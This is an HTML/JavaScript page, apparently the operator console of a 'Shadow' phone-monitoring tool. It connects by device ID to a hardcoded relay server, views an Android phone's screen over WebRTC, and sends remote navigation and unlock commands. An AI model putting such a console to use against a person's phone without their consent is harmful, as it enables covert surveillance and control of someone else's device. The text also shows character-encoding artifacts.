<!DOCTYPE html>
<html lang="en">
<head>
Â  Â  <meta charset="UTF-8">
Â  Â  <meta name="viewport" content="width=device-width, initial-scale=1.0">
Â  Â  <title>Shadow Monitor - Mobile View</title>
Â  Â Â 
Â  Â  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
Â  Â  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
Â  Â  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

Â  Â  <style>
Â  Â  Â  Â  :root {
Â  Â  Â  Â  Â  Â  --phone-bg: #000;
Â  Â  Â  Â  Â  Â  --bezel: #1a1a1a;
Â  Â  Â  Â  Â  Â  --accent: #00f3ff;
Â  Â  Â  Â  Â  Â  --glass: rgba(255, 255, 255, 0.1);
Â  Â  Â  Â  }

Â  Â  Â  Â  body {
Â  Â  Â  Â  Â  Â  background: #121212;
Â  Â  Â  Â  Â  Â  background-image: radial-gradient(#2a2a2a 1px, transparent 1px);
Â  Â  Â  Â  Â  Â  background-size: 20px 20px;
Â  Â  Â  Â  Â  Â  color: white;
Â  Â  Â  Â  Â  Â  font-family: 'Poppins', sans-serif;
Â  Â  Â  Â  Â  Â  margin: 0;
Â  Â  Â  Â  Â  Â  height: 100vh;
Â  Â  Â  Â  Â  Â  display: flex;
Â  Â  Â  Â  Â  Â  flex-direction: column;
Â  Â  Â  Â  Â  Â  align-items: center;
Â  Â  Â  Â  Â  Â  justify-content: center;
Â  Â  Â  Â  Â  Â  overflow: hidden;
Â  Â  Â  Â  }

Â  Â  Â  Â  /* --- PHONE CHASSIS (THE FRAME) --- */
Â  Â  Â  Â  .phone-frame {
Â  Â  Â  Â  Â  Â  width: 320px;
Â  Â  Â  Â  Â  Â  height: 680px;
Â  Â  Â  Â  Â  Â  background: var(--phone-bg);
Â  Â  Â  Â  Â  Â  border: 12px solid var(--bezel);
Â  Â  Â  Â  Â  Â  border-radius: 40px;
Â  Â  Â  Â  Â  Â  position: relative;
Â  Â  Â  Â  Â  Â  box-shadow: 0 0 0 2px #333, 0 20px 50px rgba(0,0,0,0.7);
Â  Â  Â  Â  Â  Â  overflow: hidden;
Â  Â  Â  Â  Â  Â  transition: transform 0.3s;
Â  Â  Â  Â  }

Â  Â  Â  Â  /* Camera Notch */
Â  Â  Â  Â  .notch {
Â  Â  Â  Â  Â  Â  position: absolute;
Â  Â  Â  Â  Â  Â  top: 10px;
Â  Â  Â  Â  Â  Â  left: 50%;
Â  Â  Â  Â  Â  Â  transform: translateX(-50%);
Â  Â  Â  Â  Â  Â  width: 80px;
Â  Â  Â  Â  Â  Â  height: 20px;
Â  Â  Â  Â  Â  Â  background: var(--bezel);
Â  Â  Â  Â  Â  Â  border-bottom-left-radius: 12px;
Â  Â  Â  Â  Â  Â  border-bottom-right-radius: 12px;
Â  Â  Â  Â  Â  Â  z-index: 100;
Â  Â  Â  Â  }

Â  Â  Â  Â  /* --- SCREEN AREA --- */
Â  Â  Â  Â  .screen {
Â  Â  Â  Â  Â  Â  width: 100%;
Â  Â  Â  Â  Â  Â  height: 100%;
Â  Â  Â  Â  Â  Â  position: relative;
Â  Â  Â  Â  Â  Â  background: #050505;
Â  Â  Â  Â  Â  Â  display: flex;
Â  Â  Â  Â  Â  Â  flex-direction: column;
Â  Â  Â  Â  }

Â  Â  Â  Â  /* Video Stream */
Â  Â  Â  Â  video {
Â  Â  Â  Â  Â  Â  width: 100%;
Â  Â  Â  Â  Â  Â  height: 100%;
Â  Â  Â  Â  Â  Â  object-fit: fill; /* Stretch to fill phone screen */
Â  Â  Â  Â  Â  Â  background: black;
Â  Â  Â  Â  }

Â  Â  Â  Â  /* --- OVERLAY (Login Screen) --- */
Â  Â  Â  Â  .overlay {
Â  Â  Â  Â  Â  Â  position: absolute;
Â  Â  Â  Â  Â  Â  top: 0; left: 0; width: 100%; height: 100%;
Â  Â  Â  Â  Â  Â  background: rgba(0,0,0,0.9);
Â  Â  Â  Â  Â  Â  display: flex;
Â  Â  Â  Â  Â  Â  flex-direction: column;
Â  Â  Â  Â  Â  Â  align-items: center;
Â  Â  Â  Â  Â  Â  justify-content: center;
Â  Â  Â  Â  Â  Â  z-index: 50;
Â  Â  Â  Â  Â  Â  backdrop-filter: blur(5px);
Â  Â  Â  Â  }

Â  Â  Â  Â  .overlay h2 { margin: 0 0 20px 0; color: var(--accent); letter-spacing: 2px; }
Â  Â  Â  Â Â 
Â  Â  Â  Â  input {
Â  Â  Â  Â  Â  Â  background: #222; border: 1px solid #444; color: white;
Â  Â  Â  Â  Â  Â  padding: 12px; border-radius: 8px; width: 70%;
Â  Â  Â  Â  Â  Â  text-align: center; font-size: 16px; margin-bottom: 15px;
Â  Â  Â  Â  Â  Â  outline: none;
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  button.connect-btn {
Â  Â  Â  Â  Â  Â  background: var(--accent); color: black; border: none;
Â  Â  Â  Â  Â  Â  padding: 12px 30px; border-radius: 30px; font-weight: bold;
Â  Â  Â  Â  Â  Â  cursor: pointer; transition: 0.2s;
Â  Â  Â  Â  Â  Â  box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
Â  Â  Â  Â  }
Â  Â  Â  Â  button.connect-btn:hover { transform: scale(1.05); }

Â  Â  Â  Â  /* --- ANDROID NAVIGATION BAR (Overlay) --- */
Â  Â  Â  Â  .nav-bar {
Â  Â  Â  Â  Â  Â  position: absolute;
Â  Â  Â  Â  Â  Â  bottom: 10px;
Â  Â  Â  Â  Â  Â  left: 0;
Â  Â  Â  Â  Â  Â  width: 100%;
Â  Â  Â  Â  Â  Â  height: 50px;
Â  Â  Â  Â  Â  Â  display: flex;
Â  Â  Â  Â  Â  Â  justify-content: space-evenly;
Â  Â  Â  Â  Â  Â  align-items: center;
Â  Â  Â  Â  Â  Â  background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
Â  Â  Â  Â  Â  Â  z-index: 20;
Â  Â  Â  Â  }

Â  Â  Â  Â  .nav-btn {
Â  Â  Â  Â  Â  Â  color: rgba(255,255,255,0.7);
Â  Â  Â  Â  Â  Â  font-size: 1.2rem;
Â  Â  Â  Â  Â  Â  cursor: pointer;
Â  Â  Â  Â  Â  Â  padding: 10px;
Â  Â  Â  Â  Â  Â  transition: 0.2s;
Â  Â  Â  Â  }
Â  Â  Â  Â  .nav-btn:active { color: white; transform: scale(0.9); }

Â  Â  Â  Â  /* --- EXTERNAL CONTROLS (Below Phone) --- */
Â  Â  Â  Â  .external-controls {
Â  Â  Â  Â  Â  Â  margin-top: 20px;
Â  Â  Â  Â  Â  Â  display: flex;
Â  Â  Â  Â  Â  Â  gap: 15px;
Â  Â  Â  Â  }

Â  Â  Â  Â  .tool-btn {
Â  Â  Â  Â  Â  Â  background: #222;
Â  Â  Â  Â  Â  Â  border: 1px solid #444;
Â  Â  Â  Â  Â  Â  color: #ccc;
Â  Â  Â  Â  Â  Â  width: 50px;
Â  Â  Â  Â  Â  Â  height: 50px;
Â  Â  Â  Â  Â  Â  border-radius: 50%;
Â  Â  Â  Â  Â  Â  display: flex;
Â  Â  Â  Â  Â  Â  align-items: center;
Â  Â  Â  Â  Â  Â  justify-content: center;
Â  Â  Â  Â  Â  Â  cursor: pointer;
Â  Â  Â  Â  Â  Â  font-size: 1.2rem;
Â  Â  Â  Â  Â  Â  transition: 0.2s;
Â  Â  Â  Â  }
Â  Â  Â  Â  .tool-btn:hover { background: #333; color: var(--accent); }
Â  Â  Â  Â  .tool-btn:active { transform: scale(0.9); }

Â  Â  Â  Â  .status-badge {
Â  Â  Â  Â  Â  Â  position: absolute;
Â  Â  Â  Â  Â  Â  top: 20px;
Â  Â  Â  Â  Â  Â  right: 20px;
Â  Â  Â  Â  Â  Â  font-size: 12px;
Â  Â  Â  Â  Â  Â  color: #666;
Â  Â  Â  Â  }
Â  Â  Â  Â  .status-badge.live { color: #00ff88; text-shadow: 0 0 10px #00ff88; }

Â  Â  </style>
</head>
<body>

Â  Â  <div class="status-badge" id="statusText">Disconnected</div>

Â  Â  <div class="phone-frame">
Â  Â  Â  Â  <div class="notch"></div>
Â  Â  Â  Â Â 
Â  Â  Â  Â  <div class="screen">
Â  Â  Â  Â  Â  Â  <div class="overlay" id="connectOverlay">
Â  Â  Â  Â  Â  Â  Â  Â  <i class="fa-solid fa-mobile-screen" style="font-size: 40px; margin-bottom: 20px; color: #444;"></i>
Â  Â  Â  Â  Â  Â  Â  Â  <h2>SHADOW</h2>
Â  Â  Â  Â  Â  Â  Â  Â  <input type="text" id="deviceId" placeholder="Enter Device ID" value="945428">
Â  Â  Â  Â  Â  Â  Â  Â  <button class="connect-btn" onclick="startViewing()">CONNECT</button>
Â  Â  Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  Â  <video id="remoteVideo" autoplay playsinline muted></video>

Â  Â  Â  Â  Â  Â  <div class="nav-bar">
Â  Â  Â  Â  Â  Â  Â  Â  <i class="fa-solid fa-chevron-left nav-btn" onclick="sendCmd('back')"></i> <i class="fa-regular fa-circle nav-btn" onclick="sendCmd('home')" style="font-size: 1rem;"></i> <i class="fa-regular fa-square nav-btn" onclick="sendCmd('recent')" style="font-size: 1rem;"></i> </div>
Â  Â  Â  Â  </div>
Â  Â  </div>

Â  Â  <div class="external-controls">
Â  Â  Â  Â  <div class="tool-btn" onclick="sendCmd('swipe_up')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
Â  Â  Â  Â  <div class="tool-btn" onclick="sendCmd('swipe_down')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
Â  Â  Â  Â  <div class="tool-btn" onclick="sendCmd('unlock')" title="Unlock/Wake"><i class="fa-solid fa-power-off"></i></div>
Â  Â  </div>

Â  Â  <script>
Â  Â  Â  Â  const SOCKET_URL = "https://child-v9no.onrender.com";Â 
Â  Â  Â  Â Â 
Â  Â  Â  Â  let socket;
Â  Â  Â  Â  let peerConnection;
Â  Â  Â  Â  const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

Â  Â  Â  Â  const statusEl = document.getElementById("statusText");
Â  Â  Â  Â  const overlayEl = document.getElementById("connectOverlay");
Â  Â  Â  Â  const videoEl = document.getElementById("remoteVideo");

Â  Â  Â  Â  // Auto-fill ID from URL if present (?id=123456)
Â  Â  Â  Â  const urlParams = new URLSearchParams(window.location.search);
Â  Â  Â  Â  if(urlParams.get('id')) document.getElementById("deviceId").value = urlParams.get('id');

Â  Â  Â  Â  function startViewing() {
Â  Â  Â  Â  Â  Â  const deviceId = document.getElementById("deviceId").value;
Â  Â  Â  Â  Â  Â  if(!deviceId) return alert("Please enter Device ID");

Â  Â  Â  Â  Â  Â  statusEl.innerText = "Connecting...";
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  if(socket) socket.disconnect();
Â  Â  Â  Â  Â  Â  socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });

Â  Â  Â  Â  Â  Â  socket.on("connect", () => {
Â  Â  Â  Â  Â  Â  Â  Â  console.log("âœ… Socket Connected");
Â  Â  Â  Â  Â  Â  Â  Â  statusEl.innerText = "Waiting for Device...";
Â  Â  Â  Â  Â  Â  Â  Â  socket.emit("join-room", deviceId);
Â  Â  Â  Â  Â  Â  Â  Â  overlayEl.style.display = "none"; // Hide Login Screen
Â  Â  Â  Â  Â  Â  });

Â  Â  Â  Â  Â  Â  socket.on("offer", async (data) => {
Â  Â  Â  Â  Â  Â  Â  Â  console.log("ðŸ“¡ Offer Received");
Â  Â  Â  Â  Â  Â  Â  Â  statusEl.innerText = "Receiving Stream...";
Â  Â  Â  Â  Â  Â  Â  Â  statusEl.className = "status-badge live";

Â  Â  Â  Â  Â  Â  Â  Â  if (peerConnection) peerConnection.close();
Â  Â  Â  Â  Â  Â  Â  Â  createPeerConnection(deviceId);

Â  Â  Â  Â  Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  // Handle JSON/String parsing safely
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  let offerDesc = data.offer;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  if (typeof offerDesc === 'string') offerDesc = JSON.parse(offerDesc);
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  await peerConnection.setRemoteDescription(new RTCSessionDescription(offerDesc));
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  const answer = await peerConnection.createAnswer();
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  await peerConnection.setLocalDescription(answer);

Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  socket.emit("answer", { target: deviceId, answer: answer });
Â  Â  Â  Â  Â  Â  Â  Â  } catch (err) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  console.error("Handshake Error:", err);
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  });

Â  Â  Â  Â  Â  Â  socket.on("candidate", async (data) => {
Â  Â  Â  Â  Â  Â  Â  Â  if (peerConnection) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  let candidateData = data.candidate;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  if (candidateData && candidateData.candidate && typeof candidateData.candidate === 'object') {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  candidateData = candidateData.candidate;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  await peerConnection.addIceCandidate(new RTCIceCandidate(candidateData));
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  } catch (e) {}
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  });

Â  Â  Â  Â  Â  Â  socket.on("disconnect", () => {
Â  Â  Â  Â  Â  Â  Â  Â  statusEl.innerText = "Disconnected";
Â  Â  Â  Â  Â  Â  Â  Â  statusEl.className = "status-badge";
Â  Â  Â  Â  Â  Â  Â  Â  overlayEl.style.display = "flex"; // Show Login Screen again
Â  Â  Â  Â  Â  Â  });
Â  Â  Â  Â  }

Â  Â  Â  Â  function createPeerConnection(targetId) {
Â  Â  Â  Â  Â  Â  peerConnection = new RTCPeerConnection(config);

Â  Â  Â  Â  Â  Â  peerConnection.ontrack = (event) => {
Â  Â  Â  Â  Â  Â  Â  Â  console.log("ðŸŽ¥ Stream Started");
Â  Â  Â  Â  Â  Â  Â  Â  videoEl.srcObject = event.streams[0];
Â  Â  Â  Â  Â  Â  };

Â  Â  Â  Â  Â  Â  peerConnection.onicecandidate = (event) => {
Â  Â  Â  Â  Â  Â  Â  Â  if (event.candidate) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  socket.emit("candidate", { target: targetId, candidate: event.candidate });
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  };
Â  Â  Â  Â  }

Â  Â  Â  Â  function sendCmd(action) {
Â  Â  Â  Â  Â  Â  const deviceId = document.getElementById("deviceId").value;
Â  Â  Â  Â  Â  Â  if(socket && socket.connected) {
Â  Â  Â  Â  Â  Â  Â  Â  // Button animation
Â  Â  Â  Â  Â  Â  Â  Â  socket.emit("control-event", { room: deviceId, action: action });
Â  Â  Â  Â  Â  Â  } else {
Â  Â  Â  Â  Â  Â  Â  Â  alert("Please connect first!");
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  </script>

</body>
</html> 
